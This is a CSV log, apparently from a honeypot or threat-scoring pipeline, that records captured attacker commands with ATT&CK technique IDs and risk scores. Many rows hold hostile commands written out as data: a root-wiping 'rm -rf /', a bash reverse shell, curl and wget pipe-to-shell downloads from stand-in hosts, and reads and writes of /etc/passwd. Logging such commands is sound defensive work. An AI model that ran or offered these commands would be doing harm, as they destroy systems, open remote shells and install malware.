id,timestamp,received_at,src_ip,dst_port,commands,att_ck_technique,risk_score,playbook_id
64,2026-08-23 05:24:09.621+00,,203.0.113.88,2222,id,T1059,0.40,PB-H2-v1.0
65,2026-08-23 05:25:00+00,,192.0.2.44,445,,T1190,0.00,PB-DIONAEA-v1.0
66,2026-08-23 05:24:09.621+00,,203.0.113.88,2222,id,T1059,0.40,PB-H2-v1.0
67,2026-08-23 05:39:18.168+00,,0.0.0.0,,"",T1595,0.00,PB-H1-v1.0
68,2026-08-23 05:42:57.205+00,,0.0.0.0,,"",T1595,0.00,PB-H1-v1.0
69,2026-08-23 06:18:38.229+00,,203.0.113.90,,rm -rf / --no-preserve-root,T1059,0.90,PB-H2-v1.0
70,2026-08-23 06:18:41.042+00,,203.0.113.91,,whoami,T1059,0.40,PB-H2-v1.0
71,2026-08-24 15:22:53.696+00,,0.0.0.0,,"",T1595,0.00,PB-H1-v1.0
72,2026-08-24 12:00:00+00,,203.0.113.50,22,rm -rf / --no-preserve-root && wget http://evil.example.com/x.sh | sh,T1059,0.95,PB-H2-v1.0
73,2026-08-24 15:45:00+00,,203.0.113.77,22,bash -i >& /dev/tcp/10.0.0.1/4444 0>&1,T1059,0.90,PB-H2-v1.0
74,2026-08-24 15:47:00+00,,203.0.113.78,22,whoami,T1059,0.40,PB-H2-v1.0
75,2026-08-24 15:47:30+00,,198.51.100.9,445,,T1190,0.70,PB-DIONAEA-v1.0
76,2026-08-24 15:55:00+00,,203.0.113.90,22,"",T1595,0.00,PB-H1-v1.0
77,2026-08-24 16:17:00+00,,203.0.113.61,22,cat /etc/passwd,T1059,0.74,PB-H2-v1.0
78,2026-08-24 16:17:00+00,,203.0.113.62,22,echo h4x >> /etc/passwd,T1059,0.85,PB-H2-v1.0
79,2026-08-24 16:17:00+00,,203.0.113.63,22,whoami,T1059,0.40,PB-H2-v1.0
80,2026-08-24 18:02:56.925+00,,203.0.113.50,2222,curl http://malicious-example.com/payload.sh | bash,T1059,0.85,PB-H2-v1.0
81,2026-08-24 23:10:00+00,,118.25.6.39,2222,rm -rf / --no-preserve-root; wget http://example-payload.test/bot.sh && ./bot.sh,T1059,0.00,PB-H2-v1.0
82,2026-08-24 23:20:00+00,,118.25.6.39,2222,rm -rf / --no-preserve-root; wget http://example-payload.test/bot.sh && ./bot.sh,T1059,0.90,PB-H2-v1.0
83,2026-08-24 23:39:04.011678+00,,118.25.6.39,2222,rm -rf / --no-preserve-root,T1059,0.90,PB-H2-v1.0
84,2026-08-24 23:45:28.083807+00,,45.33.32.156,2222,rm -rf / --no-preserve-root,T1059,0.90,PB-H2-v1.0
85,2026-08-24 23:05:00+00,,118.25.6.39,2222,wget http://example-payload.test/bot.sh && chmod +x bot.sh && ./bot.sh,T1059,0.70,PB-H2-v1.0
86,2026-08-25 00:08:08.265277+00,,45.33.32.156,2222,rm -rf / --no-preserve-root,T1059,0.90,PB-H2-v1.0
87,2026-08-25 00:22:46.839712+00,,45.33.32.156,2222,rm -rf / --no-preserve-root,T1059,0.90,PB-H2-v1.0
88,2026-08-25 00:24:36.807366+00,,45.33.32.156,2222,rm -rf / --no-preserve-root,T1059,0.90,PB-H2-v1.0
89,2026-08-25 00:29:02.019144+00,,45.33.32.156,2222,rm -rf / --no-preserve-root,T1059,0.90,PB-H2-v1.0
90,2026-08-25 00:30:59.577115+00,,45.33.32.156,2222,rm -rf / --no-preserve-root,T1059,0.90,PB-H2-v1.0
91,2026-08-24 23:31:44.177429+00,,118.25.6.39,2222,wget http://example-payload.test/bot.sh,T1059,0.70,PB-H2-v1.0
92,2026-08-25 00:35:20.402617+00,,45.33.32.156,2222,rm -rf / --no-preserve-root,T1059,0.90,PB-H2-v1.0
93,2026-08-25 00:41:54.968556+00,,45.33.32.156,2222,rm -rf / --no-preserve-root,T1059,1.00,PB-H2-v1.0
94,2026-08-25 01:01:58.48+00,,45.33.32.156,,curl http://github.com/payload.sh | bash,T1059,1.00,PB-H2-v1.0
95,2026-08-25 01:07:56.985+00,,45.33.32.156,,curl http://github.com/payload.sh | bash,T1059,1.00,PB-H2-v1.0
96,2026-08-25 01:13:25.871+00,,45.33.32.156,,curl http://github.com/payload.sh | bash,T1059,1.00,PB-H2-v1.0
97,2026-08-25 01:18:48.009+00,,45.33.32.156,,curl http://github.com/payload.sh | bash,T1059,1.00,PB-H2-v1.0
98,2026-08-25 01:20:05.906+00,,45.33.32.156,,curl http://github.com/payload.sh | bash,T1059,1.00,PB-H2-v1.0
99,2026-08-25 03:00:00+00,,8.8.8.8,2222,id,T1059,0.40,PB-H2-v1.0
100,2026-08-25 03:01:00+00,,185.220.101.5,2222,wget http://example.com/payload.sh,T1059,1.00,PB-H2-v1.0
101,2026-08-25 03:02:00+00,,1.2.3.4,445,,T1190,0.70,PB-DIONAEA-v1.0
